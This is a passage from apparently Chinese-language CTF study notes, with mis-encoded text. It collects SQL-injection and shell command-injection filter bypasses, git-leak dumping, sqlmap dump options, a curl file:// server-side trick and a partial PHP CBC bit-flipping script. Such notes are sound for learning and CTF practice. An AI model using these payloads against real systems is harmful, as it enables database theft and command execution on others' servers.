SELECTâ€¦FROMâ€¦)ä¸æ•°æ®(å¦‚å­—æ®µåï¼Œæ•°æ®è¡¨å)åˆ†ç¦»,ä½¿å¾—é’ˆå¯¹ä¸åŒæ•°æ®çš„ç›¸åŒSQLè¯­å¥çš„æ‰§è¡Œå¼€é”€æ›´å°ï¼ŒåŒæ—¶åˆå¯é˜²æ­¢SQLæ³¨å…¥çš„æ”»å‡»</p><p>ä¼ ç»Ÿæ–¹å¼çš„SQLè¯­å¥ï¼Œåœ¨æ‰§è¡Œæ—¶æ¯æ¡SQLéƒ½éœ€è¦ç»è¿‡åˆ†æã€ç¼–è¯‘å’Œä¼˜åŒ–çš„æ­¥éª¤ï¼›é¢„å¤„ç†æ–¹å¼åˆ™æ˜¯åˆ©ç”¨å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨çš„äºŒè¿›åˆ¶åè®®ï¼Œé¢„å…ˆç¼–è¯‘ä¸€æ¬¡å®¢æˆ·ç«¯å‘é€çš„SQLè¯­å¥æ¨¡æ¿,ç„¶åå†æ ¹æ®å®¢æˆ·ç«¯å‘é€ç»™æœåŠ¡å™¨ç›¸åº”æ•°é‡çš„å˜é‡è¿›è¡Œæ‰§è¡Œæ“ä½œï¼Œå¹¶æ—¦é’ˆå¯¹ä¸€æ¡SQLè¯­å¥æ¨¡æ¿å¯ä»¥æ‰§è¡Œå¤šæ¬¡,è¿˜æ— éœ€è€ƒè™‘æ•°æ®ä¸­å«æœ‰æœªè½¬ä¹‰çš„SQIå¼•å·å’Œåˆ†éš”ç¬¦å­—ç¬¦</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PREPARE stmt FROM &#39;SELECT * FROM user WHERE uname&#x3D;?&#39;;</span><br><span class="line">SET @uname&#x3D;&#39;admin&#39;;</span><br><span class="line">EXECUTE stmt USING @uname;</span><br><span class="line">DEALLOCATE &#x2F; DROP PREPARE stmt;</span><br></pre></td></tr></table></figure><p>ä»¥æ­¤ï¼Œå¯ä»¥åœ¨èƒ½å †å æ³¨å…¥æ—¶å€™ç»•è¿‡å¯¹SELECTç­‰å…³é”®å­—çš„è¿‡æ»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SET @sqlvar&#x3D;CONCAT(&#39;SE&#39;,&#39;LECT * FROM user&#39;);</span><br><span class="line">PREPARE myquery FROM @sqlvar;</span><br><span class="line">EXECUTE myquery;</span><br></pre></td></tr></table></figure><h2 id="â€èŠ±å¼ç»•è¿‡â€"><a href="#â€èŠ±å¼ç»•è¿‡â€" class="headerlink" title="â€èŠ±å¼ç»•è¿‡â€"></a><big>â€èŠ±å¼ç»•è¿‡â€</big></h2><ul><li><p>åŒå†™å…³é”®å­—ï¼šæŸäº›ç®€å•çš„wafä¸­ï¼Œå°†å…³é”®å­—<code>select</code>ç­‰åªä½¿ç”¨<code>replace()</code>å‡½æ•°ç½®æ¢ä¸ºç©ºï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨åŒå†™å…³é”®å­—ç»•è¿‡ã€‚ä¾‹å¦‚<code>select</code>å˜æˆ<code>seleselectct</code>ï¼Œåœ¨ç»wafçš„å¤„ç†ä¹‹ååˆå˜æˆ<code>select</code>ï¼Œè¾¾åˆ°ç»•è¿‡çš„è¦æ±‚</p></li><li><p>è¿‡æ»¤selectï¼šå½“å­˜åœ¨å›æ˜¾æ—¶ï¼Œå¯ä»¥åŸºäºæŠ¥é”™æ³¨å…¥ã€‚å¸¸ç”¨å‡½æ•°ä¸ºä¸¤ä¸ªæ“ä½œXMLæ–‡æ¡£çš„å‡½æ•°</p><ul><li><code>extractvalue()</code>ï¼šå¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°<ul><li>paraï¼š(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„)</li></ul></li><li><code>updatexml()</code>ï¼šæ›´æ–°xmlæ–‡æ¡£<ul><li>paraï¼š(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹)</li></ul></li></ul><p>  é€šè¿‡å°†æ­£å¸¸çš„XMLè·¯å¾„ä¿®æ”¹ä¸ºä¸ç¬¦åˆè¯­æ³•çš„è·¯å¾„å³å¯ä½¿å…¶æŠ¥é”™å¹¶æ˜¾ç¤ºé”™è¯¯å†…å®¹ï¼Œå¦‚ä¸‹é¢è¿™åˆ™æŸ¥è¯¢ï¼š</p><p>  <code>select username from security.user where id=1 and (extractvalue(â€˜anythingâ€™,concat(â€˜~â€™,(select database()))))</code></p><p>  ä¼šè¿”å›ï¼š<code>error 1105 : XPATH syntax error: &#39;~database_name&#39;</code>ï¼Œå³ <code>~</code> ä¸åº“åç»„æˆçš„å­—æ®µ</p></li><li><p>è¿‡æ»¤å¼•å·ï¼šè½¬hexï¼Œå¦‚admin =&gt; hex{61 64 6d 69 6e}</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select * from users where uname &#x3D; 0x61646d696e;</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| uname | passwd   |</span><br><span class="line">        #+-------+----------+</span><br><span class="line">        #| admin | adpasswd |</span><br><span class="line">        #+-------+----------+</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤ç©ºæ ¼ï¼š<code>/**/</code>ï¼Œ<code>()</code>ï¼Œ<code>%0a</code>ï¼Œ<code>`</code></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users;</span><br><span class="line">select(id)from(users);#æ³¨æ„*ä¸èƒ½åœ¨ç©ºæ ¼å†…</span><br><span class="line">select&#96;id&#96;from&#96;users&#96;where&#96;id&#96;&#x3D;1;</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤é€»è¾‘è¿ç®—ç¬¦ï¼š<code>and = &amp;&amp;</code>ï¼Œ<code>or = ||</code>ï¼Œ<code>xor = |</code>ï¼Œ<code>not = !</code></p></li><li><p>è¿‡æ»¤ç­‰å·ï¼š</p><ul><li><p><code>like</code>ï¼šä¸åŠ é€šé…ç¬¦%çš„likeä¸ç­‰äºç­‰æ•ˆ</p>  <center><code>select * from users where uname like 'admin';</code></center></li><li><p><code>rlike</code>ï¼šæ¨¡ç³ŠåŒ¹é…ï¼Œæœç´¢å­—æ®µä¸­å­˜åœ¨çš„éƒ¨åˆ†ï¼Œåˆ™æ‰€æœ‰åŒ…å«æœç´¢å†…å®¹çš„å­—æ®µå‡ä¼šè¢«é€‰ä¸­</p>  <center><code>select * from users where uname rlike 'admin';</code></center></li><li><p><code>regexp</code>ï¼šæ­£åˆ™åŒ¹é…</p>  <center><code>select * from users where uname regexp 'admin';</code></center></li><li><p>å¤¹é€¼ï¼š</p>  <center><code>select * from users where id>0 and id<2;</code></center></li><li><p><code>!(...&lt;&gt;...)</code>ï¼šåŒé‡å¦å®šè¡¨è‚¯å®š</p>  <center><code>select * from users where !(uname<>'admin');</code></center></li><li><p>strcmp(str1,str2)ï¼šå­—ç¬¦ä¸²ç›¸åŒè¿”å›0ï¼Œä¸åŒè¿”å›1æˆ–-1</p></li></ul>  <center><code>strcmp(ascii(substr(uname,1,1)),100)</code></center><ul><li>inï¼š</li></ul>  <center><code>substr(username,1,1) in ('a')</code></center><ul><li>between â€¦ and â€¦ï¼š</li></ul>  <center><code>substr(username,1,1) between 'a' and 'a'</code></center></li><li><p>è¿‡æ»¤é€—å·ï¼š</p><ul><li><p>å¯¹äºsubstr()ï¼Œmid()ç­‰å­—ç¬¦å¤„ç†å‡½æ•°å¯ç”¨<code>from pos for len</code>ï¼šä»<code>pos</code>å¼€å§‹è¯»<code>len</code>ä¸ªå­—ç¬¦ï¼Œç”¨æ³•ä¸º<code>substr(&#39;HelloWorld&#39; from 2 for 5)</code></p></li><li><p>å¯¹äºéœ€è¦<code>union select</code>åˆ°çš„æ´¾ç”Ÿè¡¨ï¼Œå¯ä»¥ç”¨<code>join</code>ä»£æ›¿é€—å·æ¥éš”å¼€ï¼›æ³¨æ„æ´¾ç”Ÿè¡¨éœ€è¦å¯¹å…¶å®šä¹‰ä¸€ä¸ªä¸´æ—¶è¡¨å</p>  <center><code>select 1ï¼Œ2ï¼Œ3;</code></center>  <center>ç­‰ä»·äº</center>  <center><code>select * from (select 1)a join (select 2)b join(select 3)c;</code></center></li></ul></li><li><p>è¿‡æ»¤éƒ¨åˆ†å‡½æ•°ï¼š</p><ul><li><p>sleep() â€“&gt;benchmark()ï¼šbenchmark()ç”¨äºæµ‹è¯•æŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰§è¡Œæ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯æ‰§è¡Œçš„è¡¨è¾¾å¼</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select 1 and benchmark(500000000,1);</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #| 1 and benchmark(500000000,1) |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #|                            0 |</span><br><span class="line">        #+------------------------------+</span><br><span class="line">        #1 row in set (1.49 sec)</span><br></pre></td></tr></table></figure></li><li><p>ascii()â€“&gt;hex()ã€bin()</p></li><li><p>group_concat()â€“&gt;concat_ws()</p></li><li><p>ascii()â€“&gt;ord()ï¼šè¿™ä¸¤ä¸ªå‡½æ•°åœ¨å¤„ç†è‹±æ–‡æ—¶æ•ˆæœä¸€æ ·ï¼Œä½†æ˜¯å¤„ç†ä¸­æ–‡ç­‰æ—¶ä¸ä¸€è‡´</p></li></ul></li></ul><hr><h1 id="webæ¡†æ¶"><a href="#webæ¡†æ¶" class="headerlink" title="webæ¡†æ¶"></a><big><center>webæ¡†æ¶</center></big></h1><h2 id="pythonæ¡†æ¶"><a href="#pythonæ¡†æ¶" class="headerlink" title="pythonæ¡†æ¶"></a>pythonæ¡†æ¶</h2><p><code>os.environ</code>ï¼špythonçš„ç¯å¢ƒå˜é‡ï¼Œå¯èƒ½ä¼šåœ¨é‡Œé¢éšè—ä¿¡æ¯ï¼Œæœ¬ä½“æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œç»å¯¹åœ°å€ä¸º <code>/proc/self/environ</code></p><p><code>pickle</code>ï¼šç”¨äºåºåˆ—åŒ–çš„åº“ï¼Œåºåˆ—åŒ–ï¼š<code>pickle.dumps(obj)</code>ï¼Œååºåˆ—åŒ–ï¼š<code>pickle.loads(str)</code>ï¼ˆç›´æ¥dumpã€loadï¼Œå³ä¸åŠ  s æ—¶ï¼Œæ˜¯å°†åºåˆ—åŒ–åçš„æ–‡æœ¬å‚¨å­˜åˆ°æ–‡ä»¶ä¸­ï¼‰</p><h3 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h3><h3 id="tornado"><a href="#tornado" class="headerlink" title="tornado"></a>tornado</h3><h2 id="PHPæ¡†æ¶"><a href="#PHPæ¡†æ¶" class="headerlink" title="PHPæ¡†æ¶"></a>PHPæ¡†æ¶</h2><h3 id="FatFreeFramework"><a href="#FatFreeFramework" class="headerlink" title="FatFreeFramework"></a>FatFreeFramework</h3><hr><h1 id="git"><a href="#git" class="headerlink" title="git"></a><big><center>git</center></big></h1><h2 id="gitåŸºç¡€"><a href="#gitåŸºç¡€" class="headerlink" title="gitåŸºç¡€"></a><big>gitåŸºç¡€</big></h2><p>HEADï¼šæŒ‡å‘ä½ æ­£åœ¨å·¥ä½œä¸­çš„æœ¬åœ°åˆ†æ”¯çš„æŒ‡é’ˆï¼Œå¯ä»¥å°†HEADæƒ³è±¡ä¸ºå½“å‰åˆ†æ”¯çš„åˆ«å</p><p>git reflogï¼šæŸ¥çœ‹å¼•ç”¨æ—¥å¿—ï¼Œè®°å½•åˆ†æ”¯å’ŒHEADæŒ‡å‘çš„å†å²ï¼Œè¿™äº›æ—¥å¿—å¯ä»¥è¢«åˆ é™¤ï¼Œå¹¶éç¡¬æ€§</p><p>CommitIDï¼šreflogä¸­ä¼šè®°å½•æäº¤ IDï¼Œä½œä¸ºresetçš„å‚æ•°å¯ä»¥é€€å›åˆ°æŒ‡å®šçš„æäº¤å¤„</p><p>git checkout â€“ file_path_nameï¼šç”¨äºæ”¾å¼ƒå•ä¸ªæ–‡ä»¶çš„ä¿®æ”¹ï¼Œæ³¨æ„ â€“ä¸¤è¾¹æœ‰ç©ºæ ¼</p><p>git reset [â€“hard|soft|mixed|merge|keep] [commit|HEAD]ï¼šå°†å½“å‰åˆ†æ”¯é‡è®¾åˆ°æŒ‡å®šçš„</p><p>HEAD^ï¼šé€€å›ä¸€ä¸ªå¿«ç…§ï¼Œ^æ•°é‡è¡¨ç¤ºé€€å›çš„æ­¥æ•°</p><p>git status [-s]ï¼šå‘½ä»¤ç”¨äºæŸ¥çœ‹åœ¨ä½ ä¸Šæ¬¡æäº¤ä¹‹åæ˜¯å¦æœ‰å¯¹æ–‡ä»¶è¿›è¡Œå†æ¬¡ä¿®æ”¹ï¼Œ-sè¡¨ç®€çŸ­</p><p><img src="/images/git%E6%8C%87%E4%BB%A4%E5%8F%AF%E8%A7%86%E5%8C%96.png"></p><center style="color:#C0C0C0;text-decoration:underline">å¯¹åº”çš„Gitæµç¨‹åŒºåŸŸåˆ†åˆ«ä¸º    å·¥ä½œåŒº / ç¼“å­˜åŒº / æäº¤å†å²</center><h2 id="gitæ³„æ¼"><a href="#gitæ³„æ¼" class="headerlink" title="gitæ³„æ¼"></a><big>gitæ³„æ¼</big></h2><p>åœ¨ç½‘é¡µæ›´æ–°ï¼Œä¸Šä¼ è¿‡ç¨‹ä¸­ç”±äºæ“ä½œå¤±è¯¯å¯èƒ½å¯¼è‡´ gitæ³„æ¼</p><p>ç‰¹å¾ï¼š/.gitå¯ä»¥è®¿é—®ï¼Œæˆ–é—ç•™äº† .swpï¼Œ.php.bakï¼Œ.php~ ç­‰å¤‡ä»½æ–‡ä»¶</p><p>å¯¹äº /.gitå¯ä»¥è®¿é—®çš„é¡µé¢ï¼Œå°è¯•ç”¨ GitHackæˆ– Linuxä¸­ wgetå‘½ä»¤ä¸‹è½½ .gitæ–‡ä»¶å¤¹</p><p>GitHackä¾èµ–Python2.7ç¯å¢ƒï¼š<code>python2 githack.py address/.git/</code></p><p>-rå‚æ•°ä¸ºé€’å½’ä¸‹è½½ï¼Œæ•´ç«™çˆ¬å–ï¼š<code>wget -r address/.git</code></p><hr><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><big><center>Linux</center></big></h1><h2 id="LinuxåŸºç¡€"><a href="#LinuxåŸºç¡€" class="headerlink" title="LinuxåŸºç¡€"></a><big>LinuxåŸºç¡€</big></h2><p>pwdï¼šæ˜¾ç¤ºå½“å‰ç›®å½•</p><p>dir ä¸ lsï¼šæ˜¾ç¤ºæŒ‡å®šç›®å½•å†…å®¹ï¼Œé»˜è®¤ä¸ºå½“å‰ç›®å½•</p><p>wgetï¼šä¸‹è½½å‘½ä»¤ï¼Œå…¶ä¸­ -rå‚æ•°ä¸ºé€’å½’ä¸‹è½½ï¼Œç›¸å½“äºæ•´ç«™ä¸‹è½½</p><p>æµè§ˆæ–‡ä»¶ï¼š</p><ul><li><p>catï¼šè¿æ¥æ–‡ä»¶å¹¶æ‰“å°</p></li><li><p>tacï¼šè¿æ¥æ–‡ä»¶ï¼Œå€’åºæ‰“å°</p></li><li><p>nlï¼šé“¾æ¥æ–‡ä»¶å¹¶å¸¦è¡Œå·æ‰“å°</p></li><li><p>headï¼šè¿æ¥æ–‡ä»¶ï¼Œæ‰“å°å¼€å¤´å‡ è¡Œ</p></li><li><p>tailï¼šè¿æ¥æ–‡ä»¶ï¼Œæ‰“å°æœ€åå‡ è¡Œ</p></li><li><p>moreï¼šé€é¡µæ˜¾ç¤ºå†…å®¹ï¼Œä¾¿äºé˜…è¯»ï¼Œè‡ªå¸¦ +/string æœç´¢åŠŸèƒ½ï¼Œå½“ string æ˜¯ int æ—¶ä¼šä»é‚£ä¸€è¡Œå¼€å§‹æ˜¾ç¤º</p></li><li><p>lessï¼šç›®å‰ç†è§£ä¸ºæ›´é«˜çº§çš„ more</p></li></ul><p>chmod u+xï¼šæå‡æ–‡ä»¶æƒé™ï¼Œå½“å‡ºç° zsh permission æƒé™ä½æ—¶å¯ç”¨</p><p>grepï¼šæŸ¥æ‰¾æ–‡ä»¶é‡Œç¬¦åˆæ¡ä»¶çš„å­—ç¬¦ä¸²ï¼ˆå¯æ­£åˆ™ï¼‰ï¼Œå…¨ç§° Global Regular Expression Printï¼Œå¯ç›´æ¥å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæœç´¢ï¼Œå¦‚åœ¨â€™/usr/src/Linux/Docâ€™ç›®å½•ä¸‹æœç´¢å¸¦å­—ç¬¦ ä¸²â€™magicâ€™çš„æ–‡ä»¶ï¼š<code>grep magic /usr/src/Linux/Doc/*</code></p><p>../ ä¸ ./ï¼šçˆ¶çº§ç›®å½•ä¸å½“å‰ç›®å½•</p><p>&gt;ï¼šé‡å®šå‘è¾“å‡ºï¼Œè¦†ç›–åŸæœ‰å†…å®¹ï¼Œ<code>echo 'this is flag' > flag.txt</code> #è‹¥flag.txtä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºï¼›è‹¥å­˜åœ¨ï¼Œåˆ™è¦†ç›–</p><p>&gt;&gt;ï¼šé‡å®šå‘è¾“å‡ºï¼Œè¿½åŠ æ–°å†…å®¹</p><p>&lt;ï¼šä»æ–‡ä»¶ä¸­è·å–è¾“å…¥</p><p>|ï¼šç®¡é“ (pipe)ï¼Œä»¥ä¸Šä¸€æ¡å‘½ä»¤çš„è¾“å‡ºä½œä¸ºä¸‹ä¸€æ¡å‘½ä»¤çš„å‚æ•°æˆ–è¾“å…¥</p><p>||ï¼šä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡Œå¤±è´¥åæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p><p>&amp;&amp;ï¼šä¸Šä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåæ‰æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤</p><p>?ï¼šé€šé…ç¬¦ï¼ŒåŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦</p><p>$ï¼šå£°æ˜å˜é‡</p><h2 id="â€èŠ±å¼catFlagâ€"><a href="#â€èŠ±å¼catFlagâ€" class="headerlink" title="â€èŠ±å¼catFlagâ€"></a><big>â€èŠ±å¼catFlagâ€</big></h2><ul><li><p>è¿‡æ»¤ç©ºæ ¼ï¼š<code>\&lt;</code>ï¼Œ<code>\&gt;</code>ï¼Œ<code>\&lt;/</code>ï¼Œ<code>&#123; , &#125;</code>ï¼Œ<code>\$&#123;IFS&#125;</code>ï¼Œ<code>\$IFS\$1</code> - [æ•°å­—éšæ„]</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat flag.txt</span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$9flag</span>.txt</span></span><br><span class="line">cat&lt;flag.txt</span><br><span class="line">cat&lt;&gt;flag.txt</span><br><span class="line">&#123;cat,flag.txt&#125;</span><br></pre></td></tr></table></figure></li><li><p>å †å ï¼šå½“åªæœ‰ä¸€ä¸ªè¯­å¥çš„æ—¶å€™ï¼Œæœ«å°¾æ— éœ€åˆ†å·ï¼Œæœ€åä¸€ä¸ªè¯­å¥åé¢ä¹Ÿæ— éœ€åˆ†å·</p></li><li><p>å˜é‡æ‹¼æ¥ [å‰ææ˜¯å¯ä»¥å †å ]ï¼šå¦‚ä¸‹åˆ—ä»£ç å¯¹<code>flag</code>è´ªå©ªåŒ¹é…</p>  <center><code>preg_match("/.*f.*l.*a.*g.*/", $input)</code></center>  <center>å¯¹ â†“ ç­–</center>  <center><code>$inputï¼ša=ag;b=fl;cat $b$a</code></center></li><li><p>shå‘½ä»¤æ‰§è¡Œï¼š<code>echo YourShell|sh</code></p></li><li><p>b64ç¼–ç ï¼š<code>echo YourB64|base64 -d</code></p></li><li><p>å‘½ä»¤æ›¿æ¢ï¼šåå¼•å· <code>``</code> æ¡†é€‰çš„å†…å®¹åœ¨å‘½ä»¤ä¸­ä¼˜å…ˆæ‰§è¡Œï¼Œæ‰§è¡Œç»“æœè¿”å›åˆ°åŸæœ¬åå¼•å·çš„ä½ç½®è¿›è¡Œæ›¿æ¢ï¼Œä¾‹å¦‚<code>cat &#96;ls&#96;</code>ä¼šå…ˆ lsï¼Œè¿”å›å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶åï¼Œç„¶å cat ä¼šæŠŠæ‰€æœ‰æ–‡ä»¶é€ä¸€è¿æ¥ã€æ‰“å°</p></li></ul><hr><h1 id="Tool"><a href="#Tool" class="headerlink" title="Tool"></a><big><center>Tool</center></big></h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a><big>sqlmap</big></h2><p>å…¨è‡ªåŠ¨ SQLæ‰«æå·¥å…·ï¼Œ<code>--batch</code> ä¸€é”®å¼€å¯å…¨è‡ªåŠ¨æ¨¡å¼</p><ul><li>æ³¨å…¥æ£€æµ‹<ul><li><code>-u url</code>â€”â€”æ£€æŸ¥GETå‚æ•°æ³¨å…¥ç‚¹</li><li><code>-u url -data="id=1"</code>â€”â€”æ£€æŸ¥POSTå‚æ•°æ³¨å…¥ç‚¹</li><li><code>-u url -H 'header=*'</code>â€”â€”æ£€æŸ¥HEADERæ³¨å…¥ï¼Œæ˜Ÿå·è¡¨ç¤ºæ‰‹åŠ¨æ ‡è®°æ³¨å…¥ç‚¹</li></ul></li><li>è¡¨å•çˆ†ç ´<ul><li><code>-dbs</code>â€”â€”æŸ¥çœ‹æ•°æ®åº“</li><li><code>-D database_name --tables</code>â€”â€”æŸ¥çœ‹è¡¨å</li><li><code>-D database_name -T table_name --columns</code>â€”â€”æŸ¥çœ‹åˆ—å</li><li><code>-D database_name -T table_name -C col1,col2... --dump</code>â€”â€”æŸ¥çœ‹åˆ—å†…å®¹</li></ul></li></ul><h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a><big>cURL</big></h2><p>åˆ©ç”¨ URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼ŒWindowsè‡ªå¸¦ï¼ŒGETï¼ŒPOSTï¼ŒHEADERSç­‰ curléƒ½æ”¯æŒï¼Œå’Œpythonä¸­çš„requestså·®ä¸å¤š<code>curl baidu.com</code>ï¼Œè¯¦æƒ…å¯ä»¥ curl â€“help</p><p>ä¹Ÿå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶ï¼š<code>curl file:///MyPhoto.png</code></p><p>è¿˜å¯ä»¥ä¸€è¡Œå‘½ä»¤ï¼Œå¤šä¸ªè®¿é—®ï¼š<code>curl baidu.com google.com</code></p><p>å½“æœåŠ¡ç«¯è‡ªèº«ä½¿ç”¨ curlå‘é€ GETè¯·æ±‚ï¼Œä¸” GETå†…å®¹å¯æ§æ—¶ï¼Œå¯ä»¥è·å–æœåŠ¡ç«¯æœ¬åœ° flag</p><p>æœåŠ¡ç«¯çš„æƒ…å†µï¼š<code>curl address.com/?key=$_GET['key']</code></p><p>åˆ©ç”¨å¤šä¸ªè®¿é—®ä¸æœ¬åœ°è®¿é—®ï¼Œä¼ å‚ä¸ºï¼š<code>server.com/?key=anything file:///flag</code></p><h2 id="pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…"><a href="#pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…" class="headerlink" title="pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…"></a><big>pipæŒ‡å®šç‰ˆæœ¬çš„åŒ…</big></h2><p><code>pip install lib==version</code></p><hr><h1 id="ENCRYPT"><a href="#ENCRYPT" class="headerlink" title="ENCRYPT"></a><big><center>ENCRYPT</center></big></h1><h2 id="CBCå­—ç¬¦ç¿»è½¬æ”»å‡»"><a href="#CBCå­—ç¬¦ç¿»è½¬æ”»å‡»" class="headerlink" title="CBCå­—ç¬¦ç¿»è½¬æ”»å‡»"></a><big>CBCå­—ç¬¦ç¿»è½¬æ”»å‡»</big></h2><p align='right'><small>è¿˜ä¸å¤ªæ‡‚ï¼Œæš‚å…ˆæ”¶å½•</small></p><p><a href="https://blog.csdn.net/u013577244/article/details/86310881?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3.not_use_machine_learn_pai&depth_1-utm_source=distribute.pc_relevant.no">CSDNç›¸å…³æ–‡ç« </a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">#è®¡ç®—cipher</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æ˜æ–‡1ï¼ša:2:&#123;s:8:&quot;userna//r</span></span><br><span class="line"><span class="comment">æ˜æ–‡2ï¼šme&quot;;s:5:&quot;admil&quot;;//lå­—æ¯åœ¨ç¬¬14ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment">æ˜æ–‡3ï¼šs:8:&quot;password&quot;;s</span></span><br><span class="line"><span class="comment">æ˜æ–‡4ï¼š:3:&quot;123&quot;;&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$cipher</span>=base64_decode(urldecode(<span class="string">&#x27;f0csYAAWDy%2FGlSsvWLr6NlCBad4p2U%2BXm2Rr2X07iytKd4r8V5tbO7%2FcxIib96eRDGUOMQclQgvxw2SZXOobWQ%3D%3D&#x27;</span>));</span><br><span class="line"><span class="variable">$temp</span>=<span class="variable">$cipher</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">è®¾å¯†æ–‡1[13]=A,è§£å¯†(å¯†æ–‡2)[13]=B,æ˜æ–‡2[13]=C,</span></span><br><span class="line"><span class="comment">å°†Aä¿®æ”¹ä¸ºA ^ C,åˆ™:</span></span><br><span class="line"><span class="comment">A ^ B = A ^ C ^ B = B ^ B = 0 = C</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//A  C X</span></span><br><span class="line"><span class="variable">$cipher</span>[<span class="number">13</span>]=chr(ord(<span class="variable">$cipher</span>[<span class="number">13</span>]) ^ ord(<span class="string">&#x27;l&#x27;</span>) ^ ord(<span class="string">&#x27;n&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span class="variable">$cipher</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¡ç®—iv</span></span><br><span class="line"><span class="variable">$res</span>=base64_decode(<span class="string">&#x27;yeiydaYLG5RNzOPWaQgOkG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;</span>);<span class="comment">//è¿™é‡Œæ”¾burpæ”¾å›çš„base64æ•°æ®</span></span><br><span class="line"><span class="variable">$iv</span>=base64_decode(urldecode(<span class="string">&#x27;TD9FI%2FvbrZn%2FSjbSD9bfSQ%3D%3D&#x27;</span>)); <span class="comment">//è¿™é‡Œæ”¾cookieä¸­çš„iv</span></span><br><span class="line"><span class="variable">$plaintext</span>=<span class="string">&#x27;a:2:&#123;s:8:&quot;userna&#x27;</span>;</span><br><span class="line"><span class="variable">$new_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span> ++)&#123;</span><br><span class="line">    <span class="variable">$new_iv</span>=<span class="variable">$new_iv</span>.chr(ord(<span class="variable">$iv</span>[<span class="variable">$i</span>])^ord(<span class="variable">$res</span>[<span class="variable">$i</span>])^ord(<span class="variable">$plaintext</span>[<span class="variable">$i</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(base64_encode(<span 